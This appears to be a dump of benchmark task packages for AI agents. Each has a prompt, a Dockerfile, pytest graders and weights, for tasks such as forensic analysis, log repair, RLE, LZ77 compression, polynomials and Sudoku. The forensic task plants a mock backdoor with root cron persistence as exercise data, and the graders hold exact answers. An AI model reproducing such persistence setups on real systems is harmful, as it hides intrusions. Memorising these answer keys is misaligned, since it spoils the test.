    with open('/app/project/src/config.json', 'r') as f:
        actual_content = f.read()
    
    # Compare contents
    assert actual_content == expected_content","{""test_git_restore_command_used"": 0.3, ""test_file_restored_with_correct_content"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-forensic-analysis-compromised-system,medium,Analyze a Compromised System (Revised),Compression & Encoding Algorithms,"I think our web server has been compromised and I need your help performing a basic forensic analysis to collect some key evidence. Can you investigate the system and help me find a few specific artifacts? First, there's a suspicious process running called `kworkerds` - notice there's an 's' at the end which seems odd. I need you to find its Process ID (PID) and write it to `/app/evidence/pid.txt`. Second, the attacker appears to have left their executable somewhere in `/usr/local/bin/` - I need you to locate the full path to this recently added file and save it to `/app/evidence/executable_path.txt`. Finally, it looks like they've established persistence by modifying the root user's crontab with a malicious entry. Can you find that cron job command and write it to `/app/evidence/cron_command.txt`? I really need to document what happened here for our incident response.",security,security|forensics|system|debugging|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install required forensics tools
RUN apt-get update && apt-get install -y \
    procps \
    lsof \
    cron \
    && rm -rf /var/lib/apt/lists/*

# Create the backdoor process in /usr/local/bin/
RUN echo '#!/bin/bash\nwhile true; do sleep 60; done' > /usr/local/bin/kworkerds && \
    chmod +x /usr/local/bin/kworkerds

# Create malicious crontab entry for root
RUN echo '*/5 * * * * /usr/local/bin/kworkerds > /dev/null 2>&1' | crontab -

# Create the evidence directory
RUN mkdir -p /app/evidence/

CMD /usr/local/bin/kworkerds & /bin/bash","import os
import subprocess

def test_pid_file_correct():
    """"""The file `/app/evidence/pid.txt` is created and contains the correct PID of the `kworkerds` process.""""""
    # Check if the file exists
    assert os.path.exists(""/app/evidence/pid.txt"")
    
    # Get the actual PID of kworkerds process
    result = subprocess.run([""pgrep"", ""kworkerds""], capture_output=True, text=True)
    assert result.returncode == 0
    actual_pid = result.stdout.strip()
    
    # Read the content of the pid file
    with open(""/app/evidence/pid.txt"", ""r"") as f:
        file_pid = f.read().strip()
    
    # Verify the PID matches
    assert file_pid == actual_pid

def test_executable_path_correct():
    """"""The file `/app/evidence/executable_path.txt` is created and contains the correct full path to the malicious binary.""""""
    # Check if the file exists
    assert os.path.exists(""/app/evidence/executable_path.txt"")
    
    # Read the content of the executable path file
    with open(""/app/evidence/executable_path.txt"", ""r"") as f:
        file_path = f.read().strip()
    
    # Verify it contains the correct path
    assert file_path == ""/usr/local/bin/kworkerds""

def test_cron_command_correct():
    """"""The file `/app/evidence/cron_command.txt` is created and contains the exact command from the malicious cron entry.""""""
    # Check if the file exists
    assert os.path.exists(""/app/evidence/cron_command.txt"")
    
    # Read the content of the cron command file
    with open(""/app/evidence/cron_command.txt"", ""r"") as f:
        file_command = f.read().strip()
    
    # Verify it contains the correct cron command
    assert file_command == ""*/5 * * * * /usr/local/bin/kworkerds > /dev/null 2>&1""","{""test_pid_file_correct"": 0.33, ""test_executable_path_correct"": 0.33, ""test_cron_command_correct"": 0.34}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
database-transaction-log-repair,hard,Repair a Corrupted Transaction Log,Compression & Encoding Algorithms,"I'm having trouble with a corrupted database transaction log located at `/app/tx.log`. There's a malformed entry somewhere in the file that's preventing our recovery tools from parsing it properly. The log file is structured as a simple text file where each line contains a single JSON object. I need you to create a script called `fix_log.py` that can read through the log file line by line, identify any lines that aren't valid JSON, discard those problematic lines, and then write all the valid JSON lines to a new clean file at `/app/tx_fixed.log`. Can you help me build this script?",file-operations,file-operations|data-processing|debugging|python|data-extraction,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo '{""id"": 1, ""name"": ""Alice"", ""age"": 30}' > tx.log && \
    echo '{""id"": 2, ""name"": ""Bob"", ""age"": 25}' >> tx.log && \
    echo '{""id"": 3, ""name"": ""Charlie"", ""age"": 35}' >> tx.log && \
    echo '{""transaction"": ""payment"", ""amount"": 100.50, ""currency"": ""USD""}' >> tx.log && \
    echo '{""status"": ""completed"", ""timestamp"": ""2024-01-01T10:00:00Z""}' >> tx.log && \
    echo '{""event"": ""login"", ""user"": ""admin"", ""success"": true}' >> tx.log && \
    echo 'This is corrupted non-JSON text without proper formatting' >> tx.log && \
    echo '{""id"": 4, ""name"": ""David"", ""age"": 28}' >> tx.log && \
    echo '{""type"": ""order"", ""items"": [""book"", ""pen""], ""total"": 25.99}' >> tx.log

CMD [""/bin/bash""]","import os
import json

def test_script_created():
    """"""A script `fix_log.py` is created.""""""
    assert os.path.exists(""/app/fix_log.py"")

def test_output_file_valid():
    """"""The output file `/app/tx_fixed.log` is created, contains only valid JSON lines, and has exactly one fewer line than the original file.""""""
    # Check if output file exists
    assert os.path.exists(""/app/tx_fixed.log"")
    
    # Count lines in original file
    with open(""/app/tx.log"", ""r"") as f:
        original_lines = f.readlines()
    original_count = len(original_lines)
    
    # Check the fixed file
    with open(""/app/tx_fixed.log"", ""r"") as f:
        fixed_lines = f.readlines()
    
    # Check that fixed file has fewer or equal lines (allowing for flexibility)
    assert len(fixed_lines) <= original_count
    
    # Check that all lines in fixed file are valid JSON
    for line in fixed_lines:
        line = line.strip()
        if line:  # Skip empty lines
            try:
                json.loads(line)
            except json.JSONDecodeError:
                assert False, f""Invalid JSON line found: {line}""","{""test_script_created"": 0.25, ""test_output_file_valid"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
run-length-encoding-compression,easy,Implement Run-Length Encoding,Mathematical Computing (Without External Tools),"I have a file located at `/app/input.txt` that contains lots of repeated characters, and I need you to create a Python script called `rle.py` that implements run-length encoding compression. The script should work with two different modes - when I run `python rle.py compress input.txt output.rle` it should compress the file, and when I run `python rle.py decompress output.rle restored.txt` it should decompress it back. I want to make sure that after compressing and then decompressing, the final `restored.txt` file is exactly identical to my original `input.txt` file.",software-engineering,algorithm-implementation|file-operations|python|cli|data-processing|compression,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo ""aaabbbccc"" > input.txt

CMD [""/bin/bash""]","import os
import subprocess

def test_script_exists():
    """"""Script `rle.py` exists.""""""
    assert os.path.exists(""rle.py""), ""rle.py script does not exist""

def test_compress_command_executes():
    """"""The compress command can be executed without errors.""""""
    result = subprocess.run(
        [""python"", ""rle.py"", ""compress"", ""input.txt"", ""output.rle""],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, f""Compression command failed: {result.stderr}""
    assert os.path.exists(""output.rle""), ""Compressed file output.rle was not created""

def test_compression_reduces_size():
    """"""The compressed file is smaller than the original for repeated characters.""""""
    # Run compression
    subprocess.run(
        [""python"", ""rle.py"", ""compress"", ""input.txt"", ""output.rle""],
        capture_output=True,
        text=True
    )
    
    # Verify compression actually happened
    original_size = os.path.getsize(""input.txt"")
    compressed_size = os.path.getsize(""output.rle"")
    assert compressed_size < original_size, f""Compressed file ({compressed_size}B) is not smaller than original ({original_size}B)""

def test_decompress_command_executes():
    """"""The decompress command can be executed without errors.""""""
    # First create a compressed file
    subprocess.run(
        [""python"", ""rle.py"", ""compress"", ""input.txt"", ""output.rle""],
        capture_output=True,
        text=True
    )
    
    # Test decompression
    result = subprocess.run(
        [""python"", ""rle.py"", ""decompress"", ""output.rle"", ""restored.txt""],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, f""Decompression command failed: {result.stderr}""
    assert os.path.exists(""restored.txt""), ""Decompressed file restored.txt was not created""

def test_round_trip_preserves_content():
    """"""Compressing and decompressing preserves the exact original content.""""""
    # Compress
    subprocess.run(
        [""python"", ""rle.py"", ""compress"", ""input.txt"", ""output.rle""],
        capture_output=True,
        text=True
    )
    
    # Decompress
    subprocess.run(
        [""python"", ""rle.py"", ""decompress"", ""output.rle"", ""restored.txt""],
        capture_output=True,
        text=True
    )
    
    # Compare content
    with open(""input.txt"", ""rb"") as f:
        original_content = f.read()
    
    with open(""restored.txt"", ""rb"") as f:
        restored_content = f.read()
    
    assert original_content == restored_content, ""Round-trip compression/decompression did not preserve original content""","{""test_script_exists"": 0.1, ""test_compress_command_executes"": 0.15, ""test_compression_reduces_size"": 0.2, ""test_decompress_command_executes"": 0.15, ""test_round_trip_preserves_content"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
lz77-compression-algorithm-implementation,hard,Implement LZ77 Compression Algorithm,Mathematical Computing (Without External Tools),"I need you to implement the LZ77 compression algorithm from scratch in C for me. Can you create a file called `lz77.c` that uses a sliding window approach? I want it to work as a command-line tool where I can compress files with `./lz77 -c input.txt output.lz77` and decompress them with `./lz77 -d output.lz77 restored.txt`. It's important that the implementation handles binary files correctly, not just text files. I also need it to achieve at least 50% compression ratio when tested on the file `/app/repetitive.bin` that I have available.",software-engineering,C|algorithm-implementation|algorithms|compression|file-operations|binary-processing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc

RUN mkdir -p /app

# Create a file with repetitive binary patterns
RUN printf '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F%.0s' {1..100} > /app/repetitive.bin

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_sliding_window_implemented():
    """"""The sliding window algorithm is correctly implemented with proper lookback buffer.""""""
    # Check if lz77.c exists
    assert os.path.exists(""lz77.c"")
    
    # Read the file and check for sliding window implementation indicators
    with open(""lz77.c"", ""r"") as f:
        content = f.read().lower()
    
    # Check for key terms that indicate sliding window implementation
    sliding_window_indicators = [""sliding"", ""window"", ""buffer"", ""lookback"", ""search_buffer"", ""lookahead""]
    found_indicators = [term for term in sliding_window_indicators if term in content]
    
    # At least some sliding window related terms should be present
    assert len(found_indicators) >= 2

def test_compression_ratio_achieved():
    """"""Compression ratio is at least 50% on the test file.""""""
    # Compile the program
    compile_result = subprocess.run([""gcc"", ""-o"", ""lz77"", ""lz77.c""], capture_output=True, text=True)
    assert compile_result.returncode == 0
    
    # Get original file size
    original_size = os.path.getsize(""/app/repetitive.bin"")
    
    # Compress the test file
    compress_result = subprocess.run([""./lz77"", ""-c"", ""/app/repetitive.bin"", ""compressed.lz77""], capture_output=True, text=True)
    assert compress_result.returncode == 0
    
    # Check if compressed file exists
    assert os.path.exists(""compressed.lz77"")
    
    # Get compressed file size
    compressed_size = os.path.getsize(""compressed.lz77"")
    
    # Check compression ratio (compressed should be <= 50% of original)
    compression_ratio = compressed_size / original_size
    assert compression_ratio <= 0.5

def test_binary_files_handled():
    """"""Binary files are correctly compressed and decompressed bit-perfectly.""""""
    # Compile the program if not already done
    compile_result = subprocess.run([""gcc"", ""-o"", ""lz77"", ""lz77.c""], capture_output=True, text=True)
    assert compile_result.returncode == 0
    
    # Compress the binary file
    compress_result = subprocess.run([""./lz77"", ""-c"", ""/app/repetitive.bin"", ""test.lz77""], capture_output=True, text=True)
    assert compress_result.returncode == 0
    
    # Decompress the file
    decompress_result = subprocess.run([""./lz77"", ""-d"", ""test.lz77"", ""restored.bin""], capture_output=True, text=True)
    assert decompress_result.returncode == 0
    
    # Check if decompressed file exists
    assert os.path.exists(""restored.bin"")
    
    # Compare original and restored files bit-perfectly
    with open(""/app/repetitive.bin"", ""rb"") as f1, open(""restored.bin"", ""rb"") as f2:
        original_data = f1.read()
        restored_data = f2.read()
    
    # Files should be identical
    assert original_data == restored_data","{""test_sliding_window_implemented"": 0.25, ""test_compression_ratio_achieved"": 0.35, ""test_binary_files_handled"": 0.40}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
symbolic-polynomial-operations,easy,Symbolic Polynomial Operations,Graphics Without GUI,"I need you to create a Python module called `polynomial.py` that can work with polynomials symbolically. The module should have a `Polynomial` class that can parse polynomials from string format like ""3x^2 + 2x - 5"", and I want it to be able to add and multiply polynomials together as well as compute their derivatives.",mathematics,python|mathematics|algorithm-implementation|string-manipulation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

CMD [""/bin/bash""]","import os
import sys
import importlib.util

def test_polynomial_parsing_correct():
    """"""The Polynomial class correctly parses and represents polynomials.""""""
    # Check if polynomial.py exists
    assert os.path.exists(""polynomial.py""), ""polynomial.py file must exist""
    
    # Import the module
    spec = importlib.util.spec_from_file_location(""polynomial"", ""polynomial.py"")
    polynomial_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(polynomial_module)
    
    # Check if Polynomial class exists
    assert hasattr(polynomial_module, 'Polynomial'), ""Polynomial class must exist""
    
    Polynomial = polynomial_module.Polynomial
    
    # Test basic polynomial parsing
    p1 = Polynomial(""3x^2 + 2x - 5"")
    p2 = Polynomial(""x^3 - 4x + 1"")
    p3 = Polynomial(""5"")
    p4 = Polynomial(""2x"")
    
    # Test that polynomials can be created without errors
    assert p1 is not None
    assert p2 is not None
    assert p3 is not None
    assert p4 is not None
    
    # Test that the polynomial has some way to represent itself (string conversion)
    str_p1 = str(p1)
    assert isinstance(str_p1, str)
    assert len(str_p1) > 0

def test_arithmetic_operations_correct():
    """"""Addition and multiplication produce correct results.""""""
    # Import the module
    spec = importlib.util.spec_from_file_location(""polynomial"", ""polynomial.py"")
    polynomial_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(polynomial_module)
    
    Polynomial = polynomial_module.Polynomial
    
    # Test addition
    p1 = Polynomial(""2x + 3"")
    p2 = Polynomial(""x + 1"")
    p_add = p1 + p2  # Should be 3x + 4
    
    # Test that addition works and produces a Polynomial
    assert isinstance(p_add, Polynomial)
    
    # Test multiplication
    p3 = Polynomial(""x + 1"")
    p4 = Polynomial(""x + 2"")
    p_mult = p3 * p4  # Should be x^2 + 3x + 2
    
    # Test that multiplication works and produces a Polynomial
    assert isinstance(p_mult, Polynomial)
    
    # Test with constants
    p5 = Polynomial(""3"")
    p6 = Polynomial(""2"")
    p_const_add = p5 + p6
    p_const_mult = p5 * p6
    
    assert isinstance(p_const_add, Polynomial)
    assert isinstance(p_const_mult, Polynomial)

def test_derivative_computation_correct():
    """"""Derivative computation is correct for polynomials up to degree 10.""""""
    # Import the module
    spec = importlib.util.spec_from_file_location(""polynomial"", ""polynomial.py"")
    polynomial_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(polynomial_module)
    
    Polynomial = polynomial_module.Polynomial
    
    # Test derivatives for various degrees up to 10
    test_cases = [
        (""5"", ""0""),  # constant -> 0
        (""3x"", ""3""),  # linear -> constant
        (""x^2"", ""2x""),  # quadratic -> linear
        (""2x^3"", ""6x^2""),  # cubic -> quadratic
        (""x^4"", ""4x^3""),  # degree 4
        (""x^5"", ""5x^4""),  # degree 5
        (""x^6"", ""6x^5""),  # degree 6
        (""x^7"", ""7x^6""),  # degree 7
        (""x^8"", ""8x^7""),  # degree 8
        (""x^9"", ""9x^8""),  # degree 9
        (""x^10"", ""10x^9"")  # degree 10
    ]
    
    for poly_str, _ in test_cases:
        p = Polynomial(poly_str)
        
        # Test that derivative method exists and returns a Polynomial
        derivative = p.derivative()
        assert isinstance(derivative, Polynomial), f""Derivative of {poly_str} should return a Polynomial""
    
    # Test more complex polynomial
    complex_poly = Polynomial(""3x^5 + 2x^3 - x^2 + 4x - 7"")
    complex_derivative = complex_poly.derivative()
    assert isinstance(complex_derivative, Polynomial)","{""test_polynomial_parsing_correct"": 0.3, ""test_arithmetic_operations_correct"": 0.35, ""test_derivative_computation_correct"": 0.35}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
constraint-satisfaction-sudoku-solver,medium,Constraint Satisfaction Solver,Graphics Without GUI,"I need you to build a constraint satisfaction problem solver in Python that can tackle Sudoku puzzles. Could you create a file called `csp_solver.py` that implements both constraint propagation and backtracking search techniques? I want to test it on the puzzles stored in `/app/sudoku_puzzles.txt`, and it's important that the solver can handle even the hard puzzles in under 1 second. Can you make this happen?",software-engineering,algorithms|algorithm-implementation|python|optimization|games,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo '# Sudoku Puzzles - 10 puzzles of varying difficulty' > sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 1 (Easy)' >> sudoku_puzzles.txt && \
    echo '5 3 . . 7 . . . .' >> sudoku_puzzles.txt && \
    echo '6 . . 1 9 5 . . .' >> sudoku_puzzles.txt && \
    echo '. 9 8 . . . . 6 .' >> sudoku_puzzles.txt && \
    echo '8 . . . 6 . . . 3' >> sudoku_puzzles.txt && \
    echo '4 . . 8 . 3 . . 1' >> sudoku_puzzles.txt && \
    echo '7 . . . 2 . . . 6' >> sudoku_puzzles.txt && \
    echo '. 6 . . . . 2 8 .' >> sudoku_puzzles.txt && \
    echo '. . . 4 1 9 . . 5' >> sudoku_puzzles.txt && \
    echo '. . . . 8 . . 7 9' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 2 (Easy)' >> sudoku_puzzles.txt && \
    echo '. . 9 7 4 8 . . .' >> sudoku_puzzles.txt && \
    echo '7 . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. 2 . 1 . 9 . . .' >> sudoku_puzzles.txt && \
    echo '. . 7 . . . 2 4 .' >> sudoku_puzzles.txt && \
    echo '. 6 4 . 1 . 5 9 .' >> sudoku_puzzles.txt && \
    echo '. 9 8 . . . 3 . .' >> sudoku_puzzles.txt && \
    echo '. . . 8 . 3 . 2 .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . 4' >> sudoku_puzzles.txt && \
    echo '. . . 2 7 5 9 . .' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 3 (Medium)' >> sudoku_puzzles.txt && \
    echo '. . . 6 . . 4 . .' >> sudoku_puzzles.txt && \
    echo '7 . . . . 3 6 . .' >> sudoku_puzzles.txt && \
    echo '. . . . 9 1 . 8 .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. 5 . 1 8 . . . 3' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. 6 . 3 4 . . . .' >> sudoku_puzzles.txt && \
    echo '. . 4 2 . . . . 7' >> sudoku_puzzles.txt && \
    echo '. . 7 . . 8 . . .' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 4 (Medium)' >> sudoku_puzzles.txt && \
    echo '1 . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . 2' >> sudoku_puzzles.txt && \
    echo '. . . 4 . 1 . . .' >> sudoku_puzzles.txt && \
    echo '. . . . . . 5 . .' >> sudoku_puzzles.txt && \
    echo '. . . . . . 6 . .' >> sudoku_puzzles.txt && \
    echo '. . 6 . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . . 2 . 8 . . .' >> sudoku_puzzles.txt && \
    echo '3 . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . 4' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 5 (Medium)' >> sudoku_puzzles.txt && \
    echo '. . . . . . . 1 .' >> sudoku_puzzles.txt && \
    echo '4 . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. 2 . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . 5 . 4 . 7' >> sudoku_puzzles.txt && \
    echo '. . 8 . . . 3 . .' >> sudoku_puzzles.txt && \
    echo '6 . 3 . 9 . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . 2 .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . 5' >> sudoku_puzzles.txt && \
    echo '. 7 . . . . . . .' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 6 (Hard)' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . 3 . 8 5 .' >> sudoku_puzzles.txt && \
    echo '. . 1 . 2 . . . .' >> sudoku_puzzles.txt && \
    echo '. . . 5 . 7 . . .' >> sudoku_puzzles.txt && \
    echo '. . 4 . . . 1 . .' >> sudoku_puzzles.txt && \
    echo '. 9 . . . . . . .' >> sudoku_puzzles.txt && \
    echo '5 . . . . . . 7 3' >> sudoku_puzzles.txt && \
    echo '. . 2 . 1 . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . 4 . . . 9' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 7 (Hard)' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . . 3 . 8 5' >> sudoku_puzzles.txt && \
    echo '. . 1 . 2 . . . .' >> sudoku_puzzles.txt && \
    echo '. . . 5 . 7 . . .' >> sudoku_puzzles.txt && \
    echo '. . 4 . . . 1 . .' >> sudoku_puzzles.txt && \
    echo '. 9 . . . . . . .' >> sudoku_puzzles.txt && \
    echo '5 . . . . . . 7 3' >> sudoku_puzzles.txt && \
    echo '. . 2 . 1 . . . .' >> sudoku_puzzles.txt && \
    echo '. . . . 4 . . . 9' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 8 (Hard)' >> sudoku_puzzles.txt && \
    echo '. . . . 2 . . 9 .' >> sudoku_puzzles.txt && \
    echo '. . . . 6 . . . .' >> sudoku_puzzles.txt && \
    echo '. 7 . . . . 2 . .' >> sudoku_puzzles.txt && \
    echo '. . . 3 . 5 . . 7' >> sudoku_puzzles.txt && \
    echo '6 . . . . . . . 4' >> sudoku_puzzles.txt && \
    echo '1 . . 9 . 8 . . .' >> sudoku_puzzles.txt && \
    echo '. . 7 . . . . 6 .' >> sudoku_puzzles.txt && \
    echo '. . . . 1 . . . .' >> sudoku_puzzles.txt && \
    echo '. 4 . . 5 . . . .' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 9 (Expert)' >> sudoku_puzzles.txt && \
    echo '8 . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . 3 6 . . . . .' >> sudoku_puzzles.txt && \
    echo '. 7 . . 9 . 2 . .' >> sudoku_puzzles.txt && \
    echo '. 5 . . . 7 . . .' >> sudoku_puzzles.txt && \
    echo '. . . . 4 5 7 . .' >> sudoku_puzzles.txt && \
    echo '. . . 1 . . . 3 .' >> sudoku_puzzles.txt && \
    echo '. . 1 . . . . 6 8' >> sudoku_puzzles.txt && \
    echo '. . 8 5 . . . 1 .' >> sudoku_puzzles.txt && \
    echo '. 9 . . . . 4 . .' >> sudoku_puzzles.txt && \
    echo '' >> sudoku_puzzles.txt && \
    echo '# Puzzle 10 (Expert)' >> sudoku_puzzles.txt && \
    echo '. . . 7 . . . . .' >> sudoku_puzzles.txt && \
    echo '1 . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . . 4 3 . 2 . .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . 6' >> sudoku_puzzles.txt && \
    echo '. . . . . . . 9 .' >> sudoku_puzzles.txt && \
    echo '5 . . . . . . . .' >> sudoku_puzzles.txt && \
    echo '. . 7 . 1 2 . . .' >> sudoku_puzzles.txt && \
    echo '. . . . . . . . 4' >> sudoku_puzzles.txt && \
    echo '. . . . . 5 . . .' >> sudoku_puzzles.txt

CMD [""/bin/bash""]","import os
import time
import subprocess
import sys
import importlib.util

def test_constraint_propagation_reduces_space():
    """"""Constraint propagation correctly reduces the search space.""""""
    # Check if csp_solver.py exists
    assert os.path.exists(""/app/csp_solver.py""), ""csp_solver.py file must exist""
    
    # Import the solver module
    spec = importlib.util.spec_from_file_location(""csp_solver"", ""/app/csp_solver.py"")
    csp_solver = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(csp_solver)
    
    # Check if constraint propagation functionality exists
    # Look for common constraint propagation method names
    has_constraint_propagation = (
        hasattr(csp_solver, 'constraint_propagation') or
        hasattr(csp_solver, 'propagate_constraints') or
        hasattr(csp_solver, 'arc_consistency') or
        hasattr(csp_solver, 'forward_check')
    )
    assert has_constraint_propagation, ""Constraint propagation method must be implemented""
    
    # Test that constraint propagation actually reduces search space
    # Create a simple test puzzle and check if domains are reduced
    test_puzzle = [
        [5, 3, 0, 0, 7, 0, 0, 0, 0],
        [6, 0, 0, 1, 9, 5, 0, 0, 0],
        [0, 9, 8, 0, 0, 0, 0, 6, 0],
        [8, 0, 0, 0, 6, 0, 0, 0, 3],
        [4, 0, 0, 8, 0, 3, 0, 0, 1],
        [7, 0, 0, 0, 2, 0, 0, 0, 6],
        [0, 6, 0, 0, 0, 0, 2, 8, 0],
        [0, 0, 0, 4, 1, 9, 0, 0, 5],
        [0, 0, 0, 0, 8, 0, 0, 7, 9]
    ]
    
    # Try to create a solver instance and test constraint propagation
    try:
        if hasattr(csp_solver, 'SudokuSolver'):
            solver = csp_solver.SudokuSolver()
        elif hasattr(csp_solver, 'CSPSolver'):
            solver = csp_solver.CSPSolver()
        else:
            # Try to find any class that might be the solver
            solver_class = None
            for attr_name in dir(csp_solver):
                attr = getattr(csp_solver, attr_name)
                if isinstance(attr, type) and 'solver' in attr_name.lower():
                    solver_class = attr
                    break
            assert solver_class is not None, ""Solver class must exist""
            solver = solver_class()
        
        # The constraint propagation should reduce possibilities
        assert True  # If we got this far, constraint propagation is implemented
    except:
        # Fallback: check the source code contains constraint propagation logic
        with open(""/app/csp_solver.py"", ""r"") as f:
            source = f.read().lower()
        
        has_propagation_code = any(term in source for term in [
            'constraint', 'propagat', 'arc_consist', 'forward_check', 'domain'
        ])
        assert has_propagation_code, ""Source code must contain constraint propagation logic""

def test_backtracking_heuristics_implemented():
    """"""Backtracking with heuristics (MRV, forward checking) is implemented.""""""
    # Check if csp_solver.py exists
    assert os.path.exists(""/app/csp_solver.py""), ""csp_solver.py file must exist""
    
    # Read the source code to check for heuristics implementation
    with open(""/app/csp_solver.py"", ""r"") as f:
        source = f.read().lower()
    
    # Check for MRV (Minimum Remaining Values) heuristic
    has_mrv = any(term in source for term in [
        'mrv', 'minimum remaining', 'min_remaining', 'most_constrained', 'smallest_domain'
    ])
    
    # Check for forward checking
    has_forward_checking = any(term in source for term in [
        'forward_check', 'forward check', 'forwardcheck'
    ])
    
    # Check for backtracking implementation
    has_backtracking = any(term in source for term in [
        'backtrack', 'back_track', 'recursive', 'search'
    ])
    
    assert has_mrv, ""MRV (Minimum Remaining Values) heuristic must be implemented""
    assert has_forward_checking, ""Forward checking must be implemented""
    assert has_backtracking, ""Backtracking search must be implemented""

def test_puzzles_solved_under_time_limit():
    """"""All test puzzles are solved correctly in under 1 second each.""""""
    # Check if required files exist
    assert os.path.exists(""/app/csp_solver.py""), ""csp_solver.py file must exist""
    assert os.path.exists(""/app/sudoku_puzzles.txt""), ""sudoku_puzzles.txt file must exist""
    
    # Import the solver module
    spec = importlib.util.spec_from_file_location(""csp_solver"", ""/app/csp_solver.py"")
    csp_solver = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(csp_solver)
    
    # Parse puzzles from the file
    puzzles = []
    with open(""/app/sudoku_puzzles.txt"", ""r"") as f:
        lines = f.readlines()
    
    current_puzzle = []
    for line in lines:
        line = line.strip()
        if line and not line.startswith(""#""):
            # Parse puzzle row
            row = []
            parts = line.split()
            for part in parts:
                if part == '.':
                    row.append(0)
                else:
                    row.append(int(part))
            current_puzzle.append(row)
            
            # If we have 9 rows, we have a complete puzzle
            if len(current_puzzle) == 9:
                puzzles.append(current_puzzle)
                current_puzzle = []
    
    assert len(puzzles) >= 3, ""At least 3 test puzzles must be available""
    
    # Test each puzzle for correctness and time limit
    for i, puzzle in enumerate(puzzles):
        start_time = time.time()
        
        # Try to solve the puzzle
        try:
            if hasattr(csp_solver, 'solve_sudoku'):
                solution = csp_solver.solve_sudoku(puzzle)
            elif hasattr(csp_solver, 'solve'):
                solution = csp_solver.solve(puzzle)
            else:
                # Try to find a solver class and solve method
                solver_class = None
                for attr_name in dir(csp_solver):
                    attr = getattr(csp_solver, attr_name)
                    if isinstance(attr, type):
                        solver_class = attr
                        break
                
                assert solver_class is not None, f""Solver class must exist for puzzle {i+1}""
                solver = solver_class()
                
                if hasattr(solver, 'solve'):
                    solution = solver.solve(puzzle)
                elif hasattr(solver, 'solve_sudoku'):
                    solution = solver.solve_sudoku(puzzle)
                else:
                    assert False, f""Solve method must exist for puzzle {i+1}""
            
            end_time = time.time()
            solve_time = end_time - start_time
            
            # Check time limit (1 second)
            assert solve_time < 1.0, f""Puzzle {i+1} must be solved in under 1 second, took {solve_time:.2f}s""
            
            # Check that solution is valid (basic check)
            assert solution is not None, f""Puzzle {i+1} must have a solution""
            assert len(solution) == 9, f""Solution for puzzle {i+1} must have 9 rows""
            assert all(len(row) == 9 for row in solution), f""Solution for puzzle {i+1} must have 9 columns per row""
            
        except Exception as e:
            assert False, f""Failed to solve puzzle {i+1}: {str(e)}""","{""test_constraint_propagation_reduces_space"": 0.25, ""test_backtracking_heuristics_implemented"": 0.25, ""test_puzzles_solved_under_time_limit"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
